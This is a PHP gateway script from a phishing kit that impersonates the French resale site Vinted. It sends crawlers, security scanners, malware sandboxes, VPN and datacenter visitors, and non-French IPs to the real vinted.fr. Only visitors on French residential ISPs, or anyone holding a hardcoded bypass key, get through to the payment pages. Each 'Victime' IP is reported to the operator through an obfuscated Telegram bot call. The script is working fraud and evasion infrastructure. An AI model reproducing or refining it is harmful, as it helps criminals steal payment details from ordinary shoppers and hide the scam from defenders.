<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
session_start();
include 'config.php';

// SESSION RECOVERY LOGIC - START
if(isset($_SESSION['qsdfqsdfqsdfqsdf123123']) && $_SESSION['qsdfqsdfqsdfqsdf123123'] === true && isset($_SESSION['step'])) {
    $s = $_SESSION['step'];
    if(in_array($s, ['info', 'payment', 'finished'])) {
        $map = [
            'info' => 'b.php',
            'payment' => 'p.php',
            'finished' => 'f.php'
        ];
        if(isset($map[$s])) {
            header("Location: " . $map[$s]);
            exit();
        }
    }
}
// SESSION RECOVERY LOGIC - END

function getIpInfo($ip = '') {
    $url = "https://pro.ip-api.com/json/" . $ip . "?key=LWKtz4EzQwMJRyQ&fields=status,message,countryCode,isp,org,as,mobile,proxy,hosting";
    $result = null;
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $res = curl_exec($ch);
        curl_close($ch);
        if ($res) { $result = $res; }
    }
    if (!$result && function_exists('file_get_contents') && ini_get('allow_url_fopen')) {
        $result = @file_get_contents($url);
    }
    if (!$result) return null;
    return json_decode($result, true);
}
function isMobile() {
    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
    return preg_match('/android|iphone|ipad|ipod|blackberry|windows phone|opera mini|iemobile/i', $userAgent);
}

function sendTelegramMessage($token, $chat_id, $message) {
    if (!$token || !$chat_id) return;
    $api_url = base64_decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') . $token . base64_decode('L3NlbmRNZXNzYWdl');
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    } else if (function_exists('file_get_contents') && ini_get('allow_url_fopen')) {
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data)
            ]
        ];
        $context  = stream_context_create($options);
        return @file_get_contents($api_url, false, $context);
    }
    return false;
}

$visitor_ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1';

// --- ADVANCED BASIC BOT CHECKS ---
$agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$agent_lower = strtolower($agent);

// Reject empty or weird agents
if (empty($agent) || $agent === '-' || strlen($agent) < 20) {
    header("Location: https://www.vinted.fr/");
    exit;
}

// Reverse DNS / Google Safe Browsing / Microsoft Datacenter check
$hostname = @gethostbyaddr($visitor_ip);
if ($hostname && $hostname !== $visitor_ip) {
    $bad_hosts = ['google', 'googlebot', 'compute', 'amazonaws', 'softlayer', 'cloudfront', 'github', 'phishtank', 'urlscan', 'microsoft', 'azure', 'koddos', 'leaseweb', 'choopa', 'quadranet', 'hetzner', 'ovh', 'linode', 'digitalocean', 'tor', 'exit', 'proton', 'mullvad', 'shodan', 'censys', 'masscan', 'zgrab'];
    foreach ($bad_hosts as $bad_host) {
        if (strpos(strtolower($hostname), $bad_host) !== false) {
            header("Location: https://www.vinted.fr/");
            exit;
        }
    }
}

// 0. KEYMASTER / IP LIST BYPASS
$is_managed = false;
if (isset($_GET['key']) && $_GET['key'] === 'x9K2mP7vL4wY8jN5') {
    $is_managed = true;
    $_SESSION['KEYMASTER_BYPASS'] = true;
}
if (isset($_SESSION['KEYMASTER_BYPASS']) && $_SESSION['KEYMASTER_BYPASS'] === true) {
    $is_managed = true;
}
if (!$is_managed && file_exists('security_check/ip_list.txt')) {
    $ip_list_content = file_get_contents('security_check/ip_list.txt');
    if (strpos($ip_list_content, $visitor_ip) !== false) {
        $is_managed = true;
    }
}

if (!$is_managed) {
    // EXTENSIVE USER-AGENT BLOCKER
    $bad_uas = ['bot','crawl','spider','slurp','mediapartners','adsbot','facebook','twitter','whatsapp','telegram','discord','skype','slack','insight','googlebot','monitor','checker','scan','proxy','curl','wget','python','java','httpclient','headless','phantom','puppeteer','selenium','cyber','defense','virus','malware','brandverity','google-safety','google-inspection','phishtank','urlscan','ahrefs','semrush','dotbot','mj12','yandex','baidu','bingbot','msnbot','duckduckgo','teoma','ia_archiver','censys','shodan','zgrab','masscan','nmap','nikto','openvas','netcr','detectify','probely','acunetix','nessus','wpscan','nuclei','httpie','postman','insomnia','burpsuite','fiddler','scrapy','axios','node-fetch','got/','undici','libwww','winhttp','go-http','okhttp','applebot','petalbot','sogou','bytespider','bytedance','virustotal','hybrid-analysis','cuckoo','any.run','joe-sandbox','hatching','triage', 'netcraft', 'bitdefender', 'kaspersky', 'avast'];
    foreach($bad_uas as $bad_ua) {
        if (strpos($agent_lower, $bad_ua) !== false) {
            header("Location: https://www.vinted.fr/");
            exit;
        }
    }
}

// Now API Call for ISP & GEO (if passed offline checks)
$ipinfo_json = getIpInfo($visitor_ip);
$org = (isset($ipinfo_json['as']) && $ipinfo_json['as']) ? $ipinfo_json['as'] : '';
$isp = (isset($ipinfo_json['isp']) && $ipinfo_json['isp']) ? $ipinfo_json['isp'] : '';
$org_lower = strtolower($org . ' ' . $isp);
$count = (isset($ipinfo_json['countryCode']) && $ipinfo_json['countryCode']) ? $ipinfo_json['countryCode'] : '';
$is_proxy = (isset($ipinfo_json['proxy']) && $ipinfo_json['proxy']) ? $ipinfo_json['proxy'] : false;
$is_hosting = (isset($ipinfo_json['hosting']) && $ipinfo_json['hosting']) ? $ipinfo_json['hosting'] : false;

$date = date('Y-m-d H:i:s');

// SWITZERLAND & NEIGHBORS REDIRECT (CH, LI, AT, DE, IT)
$swiss_countries = ['CH', 'LI', 'AT', 'DE', 'IT'];
if (in_array($count, $swiss_countries)) {
    header("Location: https://example2.com");
    exit;
}

// AUSTRALIA REDIRECT
if ($count === 'AU') {
    header("Location: https://australiapost.app/");
    exit;
}

if (!$is_managed) {
    // API AGGRESSIVE DATACENTER / VPN / PROXY KEYWORD BLOCKER
    if ($is_proxy || $is_hosting) {
        header("Location: https://www.vinted.fr/");
        exit;
    }

    $bad_isps = ['google','amazon','aws','azure','microsoft','ovh','digitalocean','linode','vultr','choopa','leaseweb','hostinger','cloud','proxy','vpn','datacenter','tor','mullvad','proton','expressvpn','nordvpn','cyberghost','surfshark','hidemyass','ipvanish','private internet access','vyprvpn','windscribe','tunnelbear','alibaba','tencent','cloudflare','fastly','akamai','cdn','colocation','network','telecommunication','dedibox','scaleway','contabo','buyvm','kamatera','upcloud','atlantic.net','dreamhost','bluehost','hostgator','godaddy','namecheap','ionos','strato','liquid web','siteground','kinsta','flywheel','pantheon','heroku','netlify','vercel','render','railway','supabase','firebase','oracle','ibm','Rackspace','SoftLayer'];
    foreach($bad_isps as $bad_isp) {
        if (strpos($org_lower, strtolower($bad_isp)) !== false) {
            header("Location: https://www.vinted.fr/");
            exit;
        }
    }
}

// GEO BLOCK (France Only)
if (!$is_managed && $count !== 'FR' && $visitor_ip !== '127.0.0.1') {
    header("Location: https://www.vinted.fr/");
    exit;
}

// MOBILE/PC CHECK
if (!$is_managed) {
    if ($only_mobile === true && !isMobile()) {
        header("Location: https://www.vinted.fr/");
        exit;
    } elseif ($only_mobile === false && isMobile()) {
        header("Location: https://www.vinted.fr/");
        exit;
    }
}

// 5. WHITELIST / RESIDENTIAL ISP CHECK - FRANCE ONLY
if (
    $is_managed ||
    strpos($org_lower, "orange") !== false ||
    strpos($org_lower, "sfr") !== false ||
    strpos($org_lower, "bouygues") !== false ||
    strpos($org_lower, "free") !== false ||
    strpos($org_lower, "wanadoo") !== false ||
    strpos($org_lower, "lycatel") !== false ||
    strpos($org_lower, "lycamobile") !== false ||
    strpos($org_lower, "lebara") !== false ||
    strpos($org_lower, "red by sfr") !== false ||
    strpos($org_lower, "b&you") !== false ||
    strpos($org_lower, "numericable") !== false ||
    strpos($org_lower, "sosh") !== false ||
    strpos($org_lower, "proxad") !== false ||
    strpos($org_lower, "free mobile") !== false ||
    strpos($org_lower, "la poste mobile") !== false ||
    strpos($org_lower, "nrj mobile") !== false ||
    strpos($org_lower, "cic mobile") !== false ||
    strpos($org_lower, "credit mutuel mobile") !== false ||
    strpos($org_lower, "auchan") !== false ||
    strpos($org_lower, "carrefour") !== false ||
    strpos($org_lower, "prixtel") !== false ||
    strpos($org_lower, "coriolis") !== false ||
    strpos($org_lower, "reglo mobile") !== false ||
    strpos($org_lower, "syma") !== false ||
    strpos($org_lower, "youprice") !== false ||
    strpos($org_lower, "mint mobile") !== false ||
    strpos($org_lower, "cdiscount") !== false ||
    strpos($org_lower, "source mobile") !== false ||
    strpos($org_lower, "telecom") !== false ||
    strpos($org_lower, "mobile") !== false ||
    strpos($org_lower, "bouyge") !== false
) {
    $_SESSION['MASTER'] = true;
    $_SESSION['STEP_CHAIN'] = 1;
    $_SESSION['qsdfqsdfqsdfqsdf123123'] = true;
    $_SESSION['country'] = $count;

    $accept_message = "├ ✅ Victime " . ($is_managed ? "[KEYMASTER] " : "") . "$visitor_ip accède depuis [$count]";
    sendTelegramMessage($bot_token, $chat_id, $accept_message);

    header("Location: as.php");
    exit;
} else {
    $refus_fai_message = "├ ❌ $visitor_ip a été refusé [$org]";
    sendTelegramMessage($bot_token, $chat_id, $refus_fai_message);
    header("Location: https://www.vinted.fr/");
    exit;
}
?>
